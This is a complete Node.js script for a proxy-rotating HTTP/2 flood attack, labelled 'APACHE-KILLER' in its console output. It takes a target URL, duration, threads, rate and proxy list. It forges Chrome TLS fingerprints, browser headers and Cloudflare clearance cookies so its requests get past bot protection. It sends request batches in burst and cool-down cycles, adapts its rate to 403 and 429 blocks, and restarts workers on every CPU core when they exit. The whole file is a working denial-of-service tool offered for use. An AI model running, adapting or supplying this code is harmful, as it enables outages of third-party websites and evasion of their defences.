const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]) || os.cpus().length;
let initialRatelimit = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const debugMode = process.argv.includes('--debug');

if (!target || !time || !initialRatelimit || !proxyFile) {
    console.clear();
    console.error(`
Usage: node script.js <target> <time> <threads> <rate> <proxy_file> [--query <1/2/3>] [--delay <ms>] [--debug]

Examples:
  node script.js "https://www.google.com/" 120 8 90 proxies.txt --query 1 --delay 1 --debug
  node script.js "https://www.example.com/" 60 4 150 proxies.txt
`);
    process.exit(1);
}

const url = new URL(target);
const proxies = fs.readFileSync(proxyFile, 'utf-8').split(/\r?\n/).filter(Boolean);

process
    .setMaxListeners(0)
    .on('uncaughtException', (e) => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', (e) => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    });

const statusesQ = [];
let statuses = {};
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const payloadLength = Buffer.isBuffer(payload) ? payload.length : Buffer.byteLength(payload);
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payloadLength << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    if (payloadLength > 0) {
        const payloadBuffer = Buffer.isBuffer(payload) ? payload : Buffer.from(payload);
        frame = Buffer.concat([frame, payloadBuffer]);
    }
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5) & 0x7FFFFFFF;
    const offset = flags & 0x20 ? 5 : 0;
    if (data.length < 9 + offset + length) return null;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
    }
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters[Math.floor(Math.random() * characters.length)];
    }
    return result;
}

const CHROME_VERSIONS = [
    { major: 127, minor: 0, patch: 0, build: 0 }, { major: 128, minor: 0, patch: 0, build: 0 },
    { major: 129, minor: 0, patch: 0, build: 0 }, { major: 130, minor: 0, patch: 0, build: 0 },
    { major: 131, minor: 0, patch: 0, build: 0 }, { major: 132, minor: 0, patch: 0, build: 0 },
    { major: 133, minor: 0, patch: 0, build: 0 }, { major: 134, minor: 0, patch: 0, build: 0 },
    { major: 135, minor: 0, patch: 0, build: 0 }, { major: 136, minor: 0, patch: 0, build: 0 },
];

const PLATFORMS = [
    { os: 'Windows NT 10.0; Win64; x64', platform: '"Windows"', platformVersion: '"10.0.0"', arch: '"x86"', bitness: '"64"', model: '""' },
    { os: 'Macintosh; Intel Mac OS X 10_15_7', platform: '"macOS"', platformVersion: '"10.15.7"', arch: '"x86"', bitness: '"64"', model: '""' },
    { os: 'X11; Linux x86_64', platform: '"Linux"', platformVersion: '"5.15.0"', arch: '"x86"', bitness: '"64"', model: '""' }
];

const CHROME_CIPHERS = [
    'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
];

const CHROME_SIGALGS = [
    'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384',
    'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512',
];

const CHROME_GROUPS = ['x25519', 'secp256r1', 'secp384r1'];

function generateSessionCookie() {
    const ts = Math.floor(Date.now() / 1000);
    const sessionId = crypto.randomBytes(32).toString('hex');
    const cookies = [];

    cookies.push(`__cf_bm=${crypto.randomBytes(43).toString('base64url')}`);
    cookies.push(`cf_clearance=${sessionId}.${ts}-0-1.2.0.0`);

    const gaClientId = Math.floor(Math.random() * 900000000) + 100000000;
    cookies.push(`_ga=GA1.2.${gaClientId}.${ts}`);
    cookies.push(`_gid=GA1.2.${Math.floor(Math.random() * 900000000) + 100000000}.${ts}`);

    return cookies.join('; ');
}

function generateBrowserProfile() {
    const chromeVersionObj = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
    const chromeVersion = chromeVersionObj.major;
    const selectedPlatform = PLATFORMS[Math.floor(Math.random() * PLATFORMS.length)];
    const userAgent = `Mozilla/5.0 (${selectedPlatform.os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.${chromeVersionObj.build}.${chromeVersionObj.patch} Safari/537.36`;

    let brandValue;
    if (chromeVersion >= 127 && chromeVersion <= 130) {
        brandValue = `"Not;A=Brand";v="8", "Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}"`;
    } else if (chromeVersion >= 131 && chromeVersion <= 134) {
        brandValue = `"Google Chrome";v="${chromeVersion}", "Not=A?Brand";v="99", "Chromium";v="${chromeVersion}"`;
    } else {
        brandValue = `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not;A=Brand";v="8"`;
    }

    const languages = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"];
    const randomLanguage = languages[Math.floor(Math.random() * languages.length)];
    const doNotTrack = Math.random() < 0.1 ? "1" : null;
    const secChUaFullVersion = `${chromeVersion}.0.${chromeVersionObj.build}.${chromeVersionObj.patch}`;

    return {
        userAgent,
        secChUa: brandValue,
        chromeVersion,
        secChUaPlatform: selectedPlatform.platform,
        secChUaPlatformVersion: selectedPlatform.platformVersion,
        secChUaArch: selectedPlatform.arch,
        secChUaBitness: selectedPlatform.bitness,
        secChUaModel: selectedPlatform.model,
        acceptLanguage: randomLanguage,
        ciphers: CHROME_CIPHERS.join(':'),
        sigalgs: CHROME_SIGALGS.join(':'),
        groups: CHROME_GROUPS.join(':'),
        doNotTrack,
        secChUaFullVersion,
        sessionCookie: generateSessionCookie()
    };
}

function createProxyConnection(proxy, retryCount = 0, browserProfile) {
    return new Promise((resolve, reject) => {
        if (retryCount >= 2) {
            reject(new Error('Max retries exceeded'));
            return;
        }

        const [proxyHost, proxyPort] = proxy.split(':');

        const netSocket = net.connect({
            host: proxyHost,
            port: parseInt(proxyPort),
            allowHalfOpen: false
        });

        netSocket.setTimeout(8000);

        netSocket.once('connect', () => {
            netSocket.write(`CONNECT ${url.hostname}:443 HTTP/1.1\r\nHost: ${url.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });

        netSocket.once('data', (data) => {
            if (!data.toString().includes('200')) {
                netSocket.destroy();
                setTimeout(() => {
                    createProxyConnection(proxy, retryCount + 1, browserProfile)
                        .then(resolve)
                        .catch(reject);
                }, 1000);
                return;
            }

            const tlsOptions = {
                socket: netSocket,
                servername: url.hostname,
                ALPNProtocols: ['h2'],
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
                ciphers: browserProfile.ciphers,
                sigalgs: browserProfile.sigalgs,
                ecdhCurve: browserProfile.groups,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                              crypto.constants.SSL_OP_NO_TICKET |
                              crypto.constants.SSL_OP_NO_SSLv2 |
                              crypto.constants.SSL_OP_NO_SSLv3 |
                              crypto.constants.SSL_OP_NO_COMPRESSION,
            };

            const tlsSocket = tls.connect(tlsOptions);

            const tlsTimeout = setTimeout(() => {
                tlsSocket.destroy();
                setTimeout(() => {
                    createProxyConnection(proxy, retryCount + 1, browserProfile)
                        .then(resolve)
                        .catch(reject);
                }, 1000);
            }, 8000);

            tlsSocket.on('secureConnect', () => {
                clearTimeout(tlsTimeout);
                resolve({ tlsSocket });
            });

            tlsSocket.on('error', () => {
                clearTimeout(tlsTimeout);
                setTimeout(() => {
                    createProxyConnection(proxy, retryCount + 1, browserProfile)
                        .then(resolve)
                        .catch(reject);
                }, 1000);
            });
        });

        netSocket.on('error', () => {
            netSocket.destroy();
            setTimeout(() => {
                createProxyConnection(proxy, retryCount + 1, browserProfile)
                    .then(resolve)
                    .catch(reject);
            }, 1000);
        });

        netSocket.on('timeout', () => {
            netSocket.destroy();
            setTimeout(() => {
                createProxyConnection(proxy, retryCount + 1, browserProfile)
                    .then(resolve)
                    .catch(reject);
            }, 1000);
        });
    });
}

let currentRatelimit = initialRatelimit;
let successCount = 0;
let errorCount = 0;
const ADJUSTMENT_WINDOW = 50;
const TARGET_SUCCESS_RATE = 0.85;
const ADJUSTMENT_FACTOR_DOWN = 0.75;
const ADJUSTMENT_FACTOR_UP = 1.15;
const MIN_RATELIMIT = 10;

const CYCLE_NORMAL_DURATION_MS = 10 * 1000;
const CYCLE_BURST_DURATION_MS = 5 * 1000;
const CYCLE_COOL_DOWN_DURATION_MS = 5 * 1000;
const BURST_MULTIPLIER = 2.5;
const COOL_DOWN_MULTIPLIER = 0.6;

let cycleState = 'normal';
let cycleStartTime = Date.now();
let baseRatelimitForCycle = initialRatelimit;

function updateCycleState() {
    const elapsed = Date.now() - cycleStartTime;
    if (cycleState === 'normal' && elapsed >= CYCLE_NORMAL_DURATION_MS) {
        cycleState = 'burst';
        cycleStartTime = Date.now();
    } else if (cycleState === 'burst' && elapsed >= CYCLE_BURST_DURATION_MS) {
        cycleState = 'cool-down';
        cycleStartTime = Date.now();
    } else if (cycleState === 'cool-down' && elapsed >= CYCLE_COOL_DOWN_DURATION_MS) {
        cycleState = 'normal';
        cycleStartTime = Date.now();
    }
}

let proxyIndex = 0;
function getNextProxy() {
    return proxies[proxyIndex++ % proxies.length];
}

async function go() {
    try {
        const browserProfile = generateBrowserProfile();
        const proxy = getNextProxy();
        const { tlsSocket } = await createProxyConnection(proxy, 0, browserProfile);

        let streamId = 1;
        let data = Buffer.alloc(0);
        let hpack = new HPACK();
        hpack.setTableSize(4096);

        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(15663105, 0);

        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings([
                [1, 65536],
                [2, 0],
                [4, 6291456],
                [5, 16384],
                [6, 262144]
            ])),
            encodeFrame(0, 8, updateWindow)
        ];

        tlsSocket.on('data', (eventData) => {
            data = Buffer.concat([data, eventData]);
            while (data.length >= 9) {
                const frame = decodeFrame(data);
                if (frame != null) {
                    data = data.subarray(9 + frame.length);

                    if (frame.type == 4 && frame.flags == 0) {
                        tlsSocket.write(encodeFrame(0, 4, "", 1));
                    }

                    if (frame.type == 1) {
                        try {
                            const decodedHeaders = hpack.decode(frame.payload);
                            const statusHeader = decodedHeaders.find(x => x[0] == ':status');
                            if (statusHeader) {
                                const status = parseInt(statusHeader[1]);
                                if (debugMode) {
                                    if (!statuses[status]) statuses[status] = 0;
                                    statuses[status]++;
                                }

                                if (status >= 200 && status < 300) {
                                    successCount++;
                                } else if (status === 403 || status === 429) {
                                    errorCount++;
                                }

                                if (successCount + errorCount >= ADJUSTMENT_WINDOW) {
                                    const currentSuccessRate = successCount / (successCount + errorCount);
                                    if (currentSuccessRate < TARGET_SUCCESS_RATE) {
                                        baseRatelimitForCycle = Math.max(MIN_RATELIMIT, Math.floor(baseRatelimitForCycle * ADJUSTMENT_FACTOR_DOWN));
                                    } else if (currentSuccessRate > TARGET_SUCCESS_RATE && baseRatelimitForCycle < initialRatelimit) {
                                        baseRatelimitForCycle = Math.min(initialRatelimit, Math.floor(baseRatelimitForCycle * ADJUSTMENT_FACTOR_UP));
                                    }
                                    successCount = 0;
                                    errorCount = 0;
                                }
                            }
                        } catch (e) {}
                    }

                    if (frame.type == 7) {
                        if (debugMode) {
                            if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                            statuses["GOAWAY"]++;
                        }
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }
                } else {
                    break;
                }
            }
        });

        tlsSocket.on('close', () => {
            setTimeout(go, 100);
        });

        tlsSocket.on('error', () => {
            tlsSocket.destroy();
            setTimeout(go, 200);
        });

        tlsSocket.write(Buffer.concat(frames));

        function doWrite() {
            if (tlsSocket.destroyed) return;

            updateCycleState();

            let effectiveRatelimit = baseRatelimitForCycle;
            if (cycleState === 'burst') {
                effectiveRatelimit = Math.floor(baseRatelimitForCycle * BURST_MULTIPLIER);
            } else if (cycleState === 'cool-down') {
                effectiveRatelimit = Math.floor(baseRatelimitForCycle * COOL_DOWN_MULTIPLIER);
            }
            effectiveRatelimit = Math.max(MIN_RATELIMIT, effectiveRatelimit);
            currentRatelimit = effectiveRatelimit;

            function handleQuery(query) {
                if (query === '1') {
                    return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                } else if (query === '2') {
                    return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                } else if (query === '3') {
                    return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                }
                return url.pathname;
            }

            const requests = [];
            const pathValue = query ? handleQuery(query) : url.pathname;

            const headersArray = [
                [":method", "GET"],
                [":authority", url.hostname],
                [":scheme", "https"],
                [":path", pathValue],
                ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
                ["accept-encoding", "gzip, deflate, br, zstd"],
                ["accept-language", browserProfile.acceptLanguage],
                ["cache-control", "no-cache"],
                ["cookie", browserProfile.sessionCookie],
                ["priority", "u=0, i"],
                ["sec-ch-ua", browserProfile.secChUa],
                ["sec-ch-ua-mobile", "?0"],
                ["sec-ch-ua-platform", browserProfile.secChUaPlatform],
                ["sec-ch-ua-platform-version", browserProfile.secChUaPlatformVersion],
                ["sec-ch-ua-arch", browserProfile.secChUaArch],
                ["sec-ch-ua-bitness", browserProfile.secChUaBitness],
                ["sec-ch-ua-model", browserProfile.secChUaModel],
                ["sec-ch-ua-full-version", browserProfile.secChUaFullVersion],
                ["sec-fetch-site", "none"],
                ["sec-fetch-mode", "navigate"],
                ["sec-fetch-user", "?1"],
                ["sec-fetch-dest", "document"],
                ["upgrade-insecure-requests", "1"],
                ["user-agent", browserProfile.userAgent],
            ];

            if (browserProfile.doNotTrack) {
                headersArray.splice(9, 0, ["dnt", browserProfile.doNotTrack]);
            }

            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(headersArray)
            ]);

            const batchSize = Math.floor(Math.random() * 6) + 3;
            for (let i = 0; i < batchSize; i++) {
                requests.push(encodeFrame(streamId, 1, packed, 0x25));
                streamId += 2;
            }

            tlsSocket.write(Buffer.concat(requests), (err) => {
                if (!err && !tlsSocket.destroyed) {
                    const baseDelay = 1000 / effectiveRatelimit;
                    setTimeout(doWrite, baseDelay);
                }
            });
        }

        doWrite();
    } catch (err) {
        setTimeout(go, 1000);
    }
}

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ CORE_ID: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        delete workers[worker.id];
        cluster.fork({ CORE_ID: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debugMode) {
        setInterval(() => {
            let aggregated = {};
            for (let w in workers) {
                if (workers[w] && workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (!aggregated[code]) aggregated[code] = 0;
                            aggregated[code] += st[code];
                        }
                    }
                }
            }

            const totalRequests = Object.values(aggregated).reduce((a, b) => a + b, 0);
            const successRequests = (aggregated[200] || 0) + (aggregated[204] || 0);
            const successRate = totalRequests > 0 ? ((successRequests / totalRequests) * 100).toFixed(2) : 0;
            const statusMessage = totalRequests > 0 ? `${successRate}% success` : 'RUNNING';

            console.clear();
            console.log(`[APACHE-KILLER] | Target : ${target} | Time : ${time}s | Status : ${statusMessage}`);
            console.log(`Status Codes:`, aggregated);
            console.log(`Success: ${successRequests.toLocaleString()} | Blocked: ${(totalRequests - successRequests).toLocaleString()} | Total: ${totalRequests.toLocaleString()}`);
        }, 1000);
    }

    setTimeout(() => {
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, time * 1000);

} else {
    if (process.platform === 'linux' && process.env.CORE_ID !== undefined) {
        exec(`taskset -p 0x${(1 << parseInt(process.env.CORE_ID)).toString(16)} ${process.pid}`, (err) => {
            if (err) console.error(`Failed to bind worker ${process.pid} to core ${process.env.CORE_ID}`);
        });
    }

    let conns = 0;
    let i = setInterval(() => {
        conns++;
        go();
    }, delay || 10);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => {
        process.exit(0);
    }, time * 1000);
}
